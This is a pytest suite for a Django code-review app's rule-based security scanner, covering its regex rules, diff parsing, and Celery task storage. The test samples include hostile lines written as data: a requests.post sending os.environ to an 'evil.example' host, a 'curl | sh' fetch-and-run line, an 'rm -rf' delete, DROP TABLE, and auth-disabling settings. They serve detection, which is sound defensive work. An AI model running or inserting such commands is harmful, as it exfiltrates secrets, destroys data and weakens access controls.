"""Tests for the `security_scan` app.

Task 22.1's checks come first: that the rule registry is the five-rule set
Requirement 17.1 enumerates, that each rule matches the risk shape it is
named for and leaves ordinary code alone (Requirements 17.1, 17.2), that
`scan_diff` reads *added* lines only and reports each match at its real
post-change location, and that the module contains none of the constructs
that would let it execute diff content (Requirement 17.3).

Task 22.3's checks close the file, from `TestRunSecurityScanIsACeleryTask`
onward: that `run_security_scan` stores what `scan_diff` derives, and that
the stored set describes the change set currently stored for the Run.

### Two kinds of test here, split by whether a database is involved

The rule and `scan_diff` classes are database-free. `scan_diff` never
queries or writes: it reads `run_diff.files` and `run_diff.run` off the
instance it is handed and returns *unsaved* `SecurityFinding` objects for
`run_security_scan` to `bulk_create`. So each of those cases builds an
unsaved `RunDiff` around an unsaved `Run`, which is enough for the whole
scan path and keeps them as fast as the regexes they exercise.

The `run_security_scan` classes are `pytest.mark.django_db`, because the
task's entire job is a read and a write: a test that does not read the rows
back is not testing it. `vaultshield_backend/settings_test.py` is what makes
those runnable without a running PostgreSQL.

Property 26 (Task 22.2) is the generative version of the precision cases in
`TestRuleMatching`, which are fixed samples chosen to pin each rule's
documented contract — the true and false positive shapes argued at each
pattern in `rules.py`. The remaining test tasks covering this app are 14.5
(admin registration) and 23.3 (diff ingest enqueuing the scan).
"""

import ast
import dataclasses
from pathlib import Path

import pytest
from projects.models import Project
from runs.models import Run, RunDiff
from security_scan import rules
from security_scan.models import SecurityFinding
from security_scan.rules import RULES, Rule, scan_diff
from security_scan.tasks import run_security_scan

# A generated `run_id` as `cli/vaultshield/run_directory.py` mints them.
SAMPLE_RUN_ID = "20240117-093000-0123456789abcdef"


def _run_diff(files: object) -> RunDiff:
    """An unsaved `RunDiff` carrying `files`, attached to an unsaved `Run`.

    `files` is annotated `object` rather than `list` on purpose: several
    cases below hand `scan_diff` a payload that a well-behaved ingest would
    never produce, which is the point of them.
    """
    run = Run(project=Project(name="demo", repo_url="https://example.com/x.git"),
              run_id=SAMPLE_RUN_ID, agent="mock")

    return RunDiff(run=run, files=files)


def _patch(*hunk_lines: str, new_start: int = 1) -> str:
    """One file's unified diff with a single hunk starting at `new_start`.

    `hunk_lines` are passed with their diff prefixes intact (`+`, `-`, or a
    leading space for context), so each case reads as the patch text it is.
    The `diff --git`/`index`/`---`/`+++` preamble is included because a real
    patch has one and skipping it is part of what is under test.
    """
    return "\n".join(
        [
            "diff --git a/app/api.py b/app/api.py",
            "index 1234567..89abcde 100644",
            "--- a/app/api.py",
            "+++ b/app/api.py",
            f"@@ -{new_start},4 +{new_start},6 @@",
            *hunk_lines,
        ]
    ) + "\n"


def _added(*added_lines: str, new_start: int = 1) -> str:
    """A patch whose hunk is nothing but added lines."""
    return _patch(*(f"+{line}" for line in added_lines), new_start=new_start)


def _findings_as_tuples(findings: list[SecurityFinding]) -> list[tuple]:
    return [(f.rule_id, f.file_path, f.line_number) for f in findings]


class TestRuleRegistry:
    """The registry is design.md's declaration, unchanged."""

    EXPECTED = [
        ("secret-literal", "Possible hardcoded secret"),
        ("destructive-sql", "Destructive SQL statement"),
        ("rm-rf", "Recursive force delete command"),
        ("auth-disabled", "Disabled authentication check"),
        ("outbound-call", "New outbound network call"),
    ]

    def test_the_five_requirement_17_1_categories_are_registered_in_order(self):
        """Requirement 17.1's five check categories, in the order it lists them.

        Order is asserted rather than treated as incidental: `scan_diff`
        applies rules in registry order, so it is the order multiple
        findings on one line come back in, and `bulk_create` preserves it.
        """
        assert [(rule.rule_id, rule.description) for rule in RULES] == self.EXPECTED

    def test_rule_ids_are_unique(self):
        """`rule_id` is what the Security tab groups findings by."""
        rule_ids = [rule.rule_id for rule in RULES]

        assert len(set(rule_ids)) == len(rule_ids)

    def test_every_pattern_is_precompiled(self):
        """Patterns are module-level constants compiled once at import.

        A `str` here would mean a pattern compiled per line scanned, and —
        more importantly — that a pattern could be *built* at scan time,
        which is the regex-shaped way to hand uploaded content control over
        the matcher (see `TestNoDiffContentIsEverExecuted`).
        """
        for rule in RULES:
            assert hasattr(rule.pattern, "search"), rule.rule_id

    def test_a_rule_cannot_be_mutated_after_import(self):
        """The registry is a constant read by a long-lived worker process.

        A mutable rule would let one scan change what a later scan on the
        same worker checks for.
        """
        with pytest.raises(dataclasses.FrozenInstanceError):
            RULES[0].rule_id = "tampered"

    def test_a_rule_is_hashable_so_rule_sets_are_comparable(self):
        assert len(set(RULES)) == len(RULES)
        assert isinstance(RULES[0], Rule)


class TestRuleMatching:
    """Each rule matches its risk shape and only its risk shape.

    The samples are the documented contract of each pattern in `rules.py`,
    written out: the spellings a real change uses for the risk, and the
    benign lines that look closest to it. `NOT_MATCHED` is checked against
    *every* rule, not just the one it sits under, since a false positive
    from a neighbouring rule is the same defect.
    """

    MATCHED = {
        "secret-literal": [
            # A credential-named field assigned a quoted literal.
            'API_KEY = "sk-live-4f9a2b7c1d3e5f60"',
            '    "password": "hunter2!!!",',
            "client_secret: 'abcdefghij'",
            'const authToken = "eyJhbGciOiJIUzI1NiJ9"',
            # Prefixed and suffixed field names.
            'DJANGO_SECRET_KEY = "django-insecure-abc123def456"',
            'access_token_value := "abcdefgh12345678"',
            # Self-identifying vendor formats, with no credential-named
            # field anywhere on the line.
            'boto3.client("s3", "AKIAIOSFODNN7EXAMPLE")',
            "curl -H 'Authorization: token ghp_16C7e42F292c6912E7710c838347Ae178B4a'",
            '    "Authorization": "Bearer xoxb-1234567890-abcdefghij",',
            "-----BEGIN RSA PRIVATE KEY-----",
        ],
        "destructive-sql": [
            'cursor.execute("DROP TABLE users")',
            "TRUNCATE TABLE audit_log;",
            "ALTER TABLE runs DROP COLUMN pr_url;",
            "drop database vaultshield;",
            # Unbounded delete / mass overwrite: no WHERE on the line.
            'cursor.execute("DELETE FROM users")',
            "UPDATE users SET is_admin = true",
        ],
        "rm-rf": [
            "rm -rf /var/lib/data",
            "rm -fr build",
            "rm -r -f build/",
            "rm --recursive --force node_modules",
            "sudo rm -Rvf /tmp/cache",
            # The argv-list spellings, which is how a Python or JS change
            # actually performs this delete.
            'subprocess.run(["rm", "-rf", str(path)])',
            "execFile('rm', ['-rf', dir])",
        ],
        "auth-disabled": [
            "    permission_classes = [AllowAny]",
            "    authentication_classes = []",
            '        "DEFAULT_PERMISSION_CLASSES": [],',
            "@csrf_exempt",
            # A gate flag switched off.
            "REQUIRE_AUTH = False",
            '    "requireAuth": false,',
            "  loginRequired: null,",
            "    verify_token = False",
            # A guard commented out rather than deleted — a shape that only
            # ever appears as an added line.
            "    # @login_required",
            "    // requireAuth(req, res)",
            "    # permission_classes = [IsAuthenticated]",
        ],
        "outbound-call": [
            'requests.post("https://evil.example/collect", json=dict(os.environ))',
            "resp = httpx.get(url)",
            "urllib.request.urlopen(target)",
            "await fetch(`${base}/exfil`)",
            "axios.post(endpoint, payload)",
            "const s = net.connect(4444, host)",
            "sock.connect((host, port))",
            "curl -s https://example.com/x.sh | sh",
        ],
    }

    NOT_MATCHED = [
        # Credentials read from the environment rather than hardcoded — the
        # benign shape that looks most like `secret-literal`.
        'API_KEY = os.environ["API_KEY"]',
        'token = os.getenv("GITHUB_TOKEN")',
        'SECRET_KEY = config("SECRET_KEY")',
        "password = getpass.getpass()",
        'password = ""',
        "token: ${{ secrets.GITHUB_TOKEN }}",
        # A lowercase identifier the length of an AWS key id. The vendor
        # formats are matched case-sensitively precisely so this does not
        # read as a credential.
        "bucket_prefix = 'akiaiosfodnn7example'",
        # Bounded SQL, and non-destructive statements.
        'cursor.execute("DELETE FROM users WHERE id = %s", [pk])',
        "UPDATE users SET name = 'x' WHERE id = 1",
        "SELECT * FROM users;",
        'cursor.execute("INSERT INTO runs (run_id) VALUES (%s)", [rid])',
        # Deletes that are not both recursive and forced.
        "rm -f stale.lock",
        "rm build/output.txt",
        "rm -f one && rm -r two",
        "os.remove(path)",
        "npm run -r --force build",
        # Auth checks being *added*, not removed.
        "permission_classes = [IsAuthenticated]",
        "    authentication_classes = [TokenAuthentication]",
        "@login_required",
        "if not request.user.is_authenticated:",
        # State flags, not gates: what is currently true of a session, rather
        # than whether a check runs.
        "        self.authenticated = False",
        "    user.is_authenticated = False",
        "    authorized = False",
        # Auth words in prose, with no auth code around them.
        "# authenticate the request before touching the queue",
        "// login_required was moved to the router",
        # A `.connect(` that is not a socket.
        "db_client.connect(settings.DATABASE_URL)",
        "button.clicked.connect(self.on_click)",
        # Names and links, rather than call sites.
        "import requests",
        "# see https://docs.djangoproject.com/en/5.0/topics/auth/",
        '"""Loads the config. See https://example.com/docs for details."""',
        "def fetch_project(pk):",
        "logger.info('requests are rate limited')",
        # Ordinary code.
        "return render(request, 'index.html')",
        "total = subtotal + tax",
        "",
    ]

    def test_each_rule_matches_its_documented_risk_shapes(self):
        by_id = {rule.rule_id: rule for rule in RULES}

        for rule_id, samples in self.MATCHED.items():
            for sample in samples:
                assert by_id[rule_id].pattern.search(sample) is not None, (
                    f"{rule_id} missed {sample!r}"
                )

    def test_no_rule_matches_ordinary_or_near_miss_code(self):
        """The "and only those" half of Requirement 17.2's usefulness.

        A scanner that flags `import requests` or a documentation link
        produces a Security tab a reviewer learns to ignore, which defeats
        Requirement 17's purpose more thoroughly than a missed rule would.
        """
        for sample in self.NOT_MATCHED:
            for rule in RULES:
                match = rule.pattern.search(sample)

                assert match is None, (
                    f"{rule.rule_id} flagged {sample!r} on {match.group(0)!r}"
                )

    def test_every_registered_rule_has_matching_samples(self):
        """Keeps this class honest as the registry grows."""
        assert set(self.MATCHED) == {rule.rule_id for rule in RULES}


class TestScanDiffReadsAddedLinesOnly:
    """Requirement 17.1 / design.md: added lines, never removals or context.

    Text a change *removes* cannot be a new risk, and context lines were
    already in the repository before the Run, so matching either would
    report pre-existing code as this Run's finding.
    """

    RISKY = "rm -rf /var/lib/data"

    def test_an_added_risky_line_is_reported(self):
        findings = scan_diff(_run_diff([{"path": "deploy.sh", "patch": _added(self.RISKY)}]))

        assert _findings_as_tuples(findings) == [("rm-rf", "deploy.sh", 1)]

    def test_a_removed_risky_line_is_not_reported(self):
        """The change is taking the risk *out*."""
        patch = _patch(f"-{self.RISKY}")

        assert scan_diff(_run_diff([{"path": "deploy.sh", "patch": patch}])) == []

    def test_a_context_risky_line_is_not_reported(self):
        """It was already there before this Run."""
        patch = _patch(f" {self.RISKY}", "+echo done")

        assert scan_diff(_run_diff([{"path": "deploy.sh", "patch": patch}])) == []

    def test_the_patch_path_headers_are_not_read_as_added_lines(self):
        """`+++ b/...` starts with `+` but is metadata, not content.

        Everything before the first hunk header is skipped, which is what
        keeps a header naming a risky-looking path out of the results.
        """
        patch = _patch("+ok").replace("b/app/api.py", "b/rm -rf secrets.env")

        assert scan_diff(_run_diff([{"path": "app/api.py", "patch": patch}])) == []


class TestScanDiffReportsLocation:
    """Requirement 17.2: a finding describes the matched rule *and location*."""

    def test_line_numbers_are_post_change_positions_from_the_hunk_header(self):
        patch = _patch("+rm -rf one", " context", "+rm -rf two", new_start=10)

        findings = scan_diff(_run_diff([{"path": "deploy.sh", "patch": patch}]))

        assert _findings_as_tuples(findings) == [
            ("rm-rf", "deploy.sh", 10),
            ("rm-rf", "deploy.sh", 12),
        ]

    def test_a_removed_line_does_not_advance_the_line_number(self):
        """A deleted line occupies no line in the post-change file.

        Counting it is what makes every reported number after the first
        deletion in a hunk point at the wrong line.
        """
        patch = _patch("-gone", "-also gone", "+rm -rf one", new_start=5)

        findings = scan_diff(_run_diff([{"path": "deploy.sh", "patch": patch}]))

        assert _findings_as_tuples(findings) == [("rm-rf", "deploy.sh", 5)]

    def test_the_no_newline_marker_is_not_counted_as_a_line(self):
        patch = _patch("+ok", "\\ No newline at end of file", "+rm -rf one")

        findings = scan_diff(_run_diff([{"path": "deploy.sh", "patch": patch}]))

        assert _findings_as_tuples(findings) == [("rm-rf", "deploy.sh", 2)]

    def test_numbering_restarts_at_each_hunk_header(self):
        patch = (
            "--- a/deploy.sh\n+++ b/deploy.sh\n"
            "@@ -1,1 +1,1 @@\n+rm -rf one\n"
            "@@ -40,1 +80,1 @@\n+rm -rf two\n"
        )

        findings = scan_diff(_run_diff([{"path": "deploy.sh", "patch": patch}]))

        assert _findings_as_tuples(findings) == [
            ("rm-rf", "deploy.sh", 1),
            ("rm-rf", "deploy.sh", 80),
        ]

    def test_file_path_comes_from_the_entry_not_from_the_patch_text(self):
        """The entry's `path` is authoritative; patch headers are not.

        Recovering the path from uploaded diff text would let the content
        say which file a finding belongs to.
        """
        patch = _added("rm -rf one").replace("b/app/api.py", "b/somewhere/else.py")

        findings = scan_diff(_run_diff([{"path": "deploy.sh", "patch": patch}]))

        assert [finding.file_path for finding in findings] == ["deploy.sh"]


class TestScanDiffFindingContents:
    """What each returned `SecurityFinding` carries, and in what order."""

    def test_findings_carry_the_run_and_the_rule_description(self):
        run_diff = _run_diff([{"path": "deploy.sh", "patch": _added("rm -rf /data")}])

        finding = scan_diff(run_diff)[0]

        assert finding.run is run_diff.run
        assert finding.rule_id == "rm-rf"
        assert finding.description == "Recursive force delete command"

    def test_findings_are_returned_unsaved(self):
        """`run_security_scan` (Task 22.3) persists them with one
        `bulk_create`, so `scan_diff` must not write."""
        findings = scan_diff(_run_diff([{"path": "deploy.sh", "patch": _added("rm -rf /data")}]))

        assert [finding.pk for finding in findings] == [None]

    def test_one_finding_per_rule_per_line_even_when_a_rule_matches_twice(self):
        """`SecurityFinding` stores no offset or matched text.

        Two findings from one line would be byte-identical rows, so a
        second one is nothing a reviewer could act on separately.
        """
        line = "rm -rf /one && rm -rf /two"

        findings = scan_diff(_run_diff([{"path": "deploy.sh", "patch": _added(line)}]))

        assert _findings_as_tuples(findings) == [("rm-rf", "deploy.sh", 1)]

    def test_different_rules_matching_one_line_each_produce_a_finding(self):
        """They differ in `rule_id` and describe different risks."""
        line = 'subprocess.run(["rm", "-rf", "/data"]); requests.get("https://x.example")'

        findings = scan_diff(_run_diff([{"path": "wipe.py", "patch": _added(line)}]))

        assert _findings_as_tuples(findings) == [
            ("rm-rf", "wipe.py", 1),
            ("outbound-call", "wipe.py", 1),
        ]

    def test_ordering_is_file_then_line_then_registry_order(self):
        files = [
            {"path": "b_second.py", "patch": _added("rm -rf /data", 'requests.get("http://x.y")')},
            {"path": "a_first.py", "patch": _added('API_KEY = "sk-live-abcdef1234567890"')},
        ]

        findings = scan_diff(_run_diff(files))

        assert _findings_as_tuples(findings) == [
            ("rm-rf", "b_second.py", 1),
            ("outbound-call", "b_second.py", 2),
            ("secret-literal", "a_first.py", 1),
        ]

    def test_a_clean_change_set_produces_no_findings(self):
        files = [{"path": "app/api.py", "patch": _added("return render(request, 'index.html')")}]

        assert scan_diff(_run_diff(files)) == []


class TestScanDiffTolerateMalformedPayloads:
    """`RunDiff.files` is a `JSONField`, so the column guarantees nothing.

    Ingest validation normally supplies the shape, but a row written by a
    fixture, a data migration, or a shell is under no such guarantee. This
    runs in a Celery worker with no request to return a 400 to, so a bad
    entry is skipped rather than raised on — otherwise one malformed row
    becomes a task that fails on every retry and blocks a Run's review.
    """

    RISKY_ENTRY = {"path": "deploy.sh", "patch": _added("rm -rf /data")}

    def test_a_count_only_entry_yields_no_findings(self):
        """Every entry today's ingest path produces carries no patch text.

        `FileDiffStatSerializer` validates a file entry down to `path`,
        `additions`, and `deletions`, so there is no added-line text to
        scan — which is a truthful "nothing scanned", not a silent pass.
        See `rules.py`'s module docstring on that gap.
        """
        files = [{"path": "deploy.sh", "additions": 12, "deletions": 3}]

        assert scan_diff(_run_diff(files)) == []

    def test_an_empty_change_set_yields_no_findings(self):
        """`build_structured_diff` writes `{"files": []}` for a no-op Run."""
        assert scan_diff(_run_diff([])) == []

    def test_a_files_value_that_is_not_a_list_is_skipped(self):
        for bad_value in (None, "nope", 7, {"path": "x"}):
            assert scan_diff(_run_diff(bad_value)) == [], f"scanned files={bad_value!r}"

    def test_unusable_entries_are_skipped_without_affecting_their_neighbours(self):
        """One bad row must not cost the rest of the change set its scan."""
        files = [
            None,
            "not an entry",
            {"patch": _added("rm -rf /data")},          # no path
            {"path": "  ", "patch": _added("rm -rf /data")},   # blank path
            {"path": 7, "patch": _added("rm -rf /data")},      # non-string path
            {"path": "a.sh", "patch": ["not", "a", "string"]},
            {"path": "b.sh", "patch": None},
            self.RISKY_ENTRY,
        ]

        findings = scan_diff(_run_diff(files))

        assert _findings_as_tuples(findings) == [("rm-rf", "deploy.sh", 1)]

    def test_an_empty_patch_is_a_well_formed_entry_with_nothing_to_scan(self):
        assert scan_diff(_run_diff([{"path": "deploy.sh", "patch": ""}])) == []

    def test_patch_text_with_no_hunk_header_yields_no_added_lines(self):
        """Without a hunk header there is no post-change position to report,
        and a bare `+` line outside a hunk is a `+++` path header."""
        files = [{"path": "deploy.sh", "patch": "+rm -rf /data\n"}]

        assert scan_diff(_run_diff(files)) == []


class TestNoDiffContentIsEverExecuted:
    """Requirement 17.3: rule-based analysis only, no code from the diff run.

    This is asserted structurally, over the module's own syntax tree,
    because the requirement is satisfied by the *absence* of certain
    constructs rather than by a guard that could be bypassed. Parsing
    rather than grepping matters: `rules.py`'s docstring names every one of
    these constructs while explaining why it is absent, so a substring
    search would match the prose it is meant to be checking.
    """

    ALLOWED_IMPORTS = {
        "__future__",
        "re",
        "collections.abc",
        "dataclasses",
        "typing",
        "security_scan.models",
        "runs.models",
    }

    # Builtins that would let scanned text become code. Every dangerous
    # *module* is already excluded by `ALLOWED_IMPORTS` above — no
    # `subprocess`, `os`, `importlib`, `pickle`, `yaml`, or `ast` — so the
    # remaining surface is the builtins, which need no import.
    FORBIDDEN_CALLS = {"exec", "eval", "compile", "__import__", "open", "input"}

    @staticmethod
    def _tree() -> ast.Module:
        source = Path(rules.__file__).read_text(encoding="utf-8")

        return ast.parse(source)

    @staticmethod
    def _called_names(node: ast.AST) -> set[str]:
        """Every callee, as its full dotted path (`re.compile`, `int`, ...).

        Dotted rather than bare-attribute, so the legitimate `re.compile`
        is distinguishable from the builtin `compile`.
        """
        def dotted(func: ast.expr) -> str | None:
            if isinstance(func, ast.Name):
                return func.id
            if isinstance(func, ast.Attribute):
                parent = dotted(func.value)
                return f"{parent}.{func.attr}" if parent else func.attr
            return None

        return {
            name
            for called in ast.walk(node)
            if isinstance(called, ast.Call)
            for name in [dotted(called.func)]
            if name is not None
        }

    def test_the_module_imports_nothing_that_could_run_diff_content(self):
        imported: set[str] = set()
        for node in ast.walk(self._tree()):
            if isinstance(node, ast.Import):
                imported.update(alias.name for alias in node.names)
            elif isinstance(node, ast.ImportFrom):
                imported.add(node.module or "")

        assert imported <= self.ALLOWED_IMPORTS, imported - self.ALLOWED_IMPORTS

    def test_no_construct_that_turns_text_into_code_is_called(self):
        assert self._called_names(self._tree()) & self.FORBIDDEN_CALLS == set()

    def test_no_pattern_is_compiled_inside_a_function(self):
        """Every pattern is a module-level literal, compiled once at import.

        A `re.compile` reachable at scan time is how uploaded content would
        get a say in the matcher itself — the regex-shaped version of the
        same risk this requirement is about.
        """
        for node in ast.walk(self._tree()):
            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
                assert "re.compile" not in self._called_names(node), node.name


# --- Task 22.3: `run_security_scan` -----------------------------------------

RISKY_LINE = "rm -rf /var/lib/data"
RISKY_PATCH = _added(RISKY_LINE)
CLEAN_PATCH = _added("return render(request, 'index.html')")


def _saved_run(run_id: str = SAMPLE_RUN_ID) -> Run:
    """A persisted `Run` (with its `Project`) and no artifacts yet."""
    project = Project.objects.create(name="demo", repo_url="https://example.com/x.git")

    return Run.objects.create(project=project, run_id=run_id, agent="mock")


def _stored_findings(run: Run) -> list[tuple]:
    """This Run's stored findings, in insertion order.

    Ordered by `pk` explicitly: `SecurityFinding` declares no `Meta.ordering`,
    so an unordered read is free to come back in any order — which would make
    the ordering assertion below pass or fail for reasons unrelated to what it
    is checking.
    """
    return list(
        run.security_findings.order_by("pk").values_list("rule_id", "file_path", "line_number")
    )


class TestRunSecurityScanIsACeleryTask:
    """Requirement 18.1's half that belongs to this module: it is a task.

    Database-free, and deliberately importable with no Celery app
    constructed — Task 23.1 has not wired one yet, and `shared_task`
    resolving the app lazily is what keeps this module (and therefore the
    whole test file) importable in the meantime.
    """

    def test_it_is_registered_under_its_autodiscovered_name(self):
        """`autodiscover_tasks()` (Task 23.1) finds `<app>/tasks.py`, so this
        is the name the enqueue site in Task 23.2 will resolve."""
        assert run_security_scan.name == "security_scan.tasks.run_security_scan"

    def test_it_can_be_enqueued_rather_than_only_called(self):
        assert callable(getattr(run_security_scan, "delay", None))


@pytest.mark.django_db
class TestRunSecurityScanStoresFindings:
    """Requirements 17.1, 17.2: matches against the Run's diff become rows."""

    def test_a_risky_added_line_becomes_a_finding_on_that_run(self):
        run = _saved_run()
        RunDiff.objects.create(run=run, files=[{"path": "deploy.sh", "patch": RISKY_PATCH}])

        run_security_scan(run.run_id)

        assert _stored_findings(run) == [("rm-rf", "deploy.sh", 1)]

    def test_a_stored_finding_describes_the_matched_rule(self):
        """Requirement 17.2: the record describes the rule *and* location."""
        run = _saved_run()
        RunDiff.objects.create(run=run, files=[{"path": "deploy.sh", "patch": RISKY_PATCH}])

        run_security_scan(run.run_id)

        finding = SecurityFinding.objects.get(run=run)
        assert finding.rule_id == "rm-rf"
        assert finding.description == "Recursive force delete command"
        assert finding.file_path == "deploy.sh"
        assert finding.line_number == 1

    def test_storage_preserves_the_scan_order(self):
        """File, then line, then registry order — `bulk_create` keeps the
        order it is given, so that is the order the Security tab reads."""
        run = _saved_run()
        RunDiff.objects.create(
            run=run,
            files=[
                {"path": "b_second.py", "patch": _added(RISKY_LINE, 'requests.get("http://x.y")')},
                {"path": "a_first.py", "patch": _added('API_KEY = "sk-live-abcdef1234567890"')},
            ],
        )

        run_security_scan(run.run_id)

        assert _stored_findings(run) == [
            ("rm-rf", "b_second.py", 1),
            ("outbound-call", "b_second.py", 2),
            ("secret-literal", "a_first.py", 1),
        ]

    def test_a_clean_change_set_stores_nothing(self):
        run = _saved_run()
        RunDiff.objects.create(run=run, files=[{"path": "app/api.py", "patch": CLEAN_PATCH}])

        run_security_scan(run.run_id)

        assert SecurityFinding.objects.count() == 0

    def test_only_the_scanned_runs_findings_are_written(self):
        """The task is addressed by `run_id`, so a second Run's diff is not
        scanned and its stored findings are not touched."""
        scanned = _saved_run("20240117-093000-0123456789abcdef")
        other = _saved_run("20240118-101500-fedcba9876543210")
        RunDiff.objects.create(run=scanned, files=[{"path": "deploy.sh", "patch": RISKY_PATCH}])
        RunDiff.objects.create(run=other, files=[{"path": "wipe.sh", "patch": RISKY_PATCH}])
        preexisting = SecurityFinding.objects.create(
            run=other, rule_id="rm-rf", file_path="wipe.sh", line_number=1, description="x"
        )

        run_security_scan(scanned.run_id)

        assert _stored_findings(scanned) == [("rm-rf", "deploy.sh", 1)]
        assert list(other.security_findings.values_list("pk", flat=True)) == [preexisting.pk]


@pytest.mark.django_db
class TestRunSecurityScanIsRepeatable:
    """A Run can be scanned more than once, so the second scan must replace.

    `RunDiff.run` is a `OneToOneField`: a repeat `POST /api/runs/:id/diff/`
    replaces the change set, and the Uploader's retry from local artifacts
    (Requirement 14.4) makes that a real flow. Each POST enqueues a scan, so
    appending would leave a Run holding the union of both — duplicate rows,
    plus findings for lines the current diff no longer contains.
    """

    def test_rescanning_the_same_diff_does_not_duplicate_findings(self):
        run = _saved_run()
        RunDiff.objects.create(run=run, files=[{"path": "deploy.sh", "patch": RISKY_PATCH}])

        run_security_scan(run.run_id)
        run_security_scan(run.run_id)

        assert _stored_findings(run) == [("rm-rf", "deploy.sh", 1)]

    def test_findings_from_a_replaced_diff_do_not_survive(self):
        run = _saved_run()
        diff = RunDiff.objects.create(run=run, files=[{"path": "deploy.sh", "patch": RISKY_PATCH}])
        run_security_scan(run.run_id)

        diff.files = [{"path": "app/api.py", "patch": CLEAN_PATCH}]
        diff.save()
        run_security_scan(run.run_id)

        assert _stored_findings(run) == []


@pytest.mark.django_db
class TestRunSecurityScanToleratesAMissingDiff:
    """Nothing to scan is a no-op, not a crashed worker.

    There is no request to answer and no retry that could succeed, so a
    `RunDiff` that is absent by the time the task runs must not fail the
    task — see the module docstring in `tasks.py`.
    """

    def test_a_run_whose_diff_was_never_uploaded_is_skipped(self):
        run = _saved_run()

        run_security_scan(run.run_id)

        assert SecurityFinding.objects.count() == 0

    def test_an_unknown_run_id_is_skipped(self):
        """A queued task can outlive the Run it names — `vaultshield
        teardown` deletes one, and the cascade takes its diff with it."""
        run_security_scan("20990101-000000-0000000000000000")

        assert SecurityFinding.objects.count() == 0
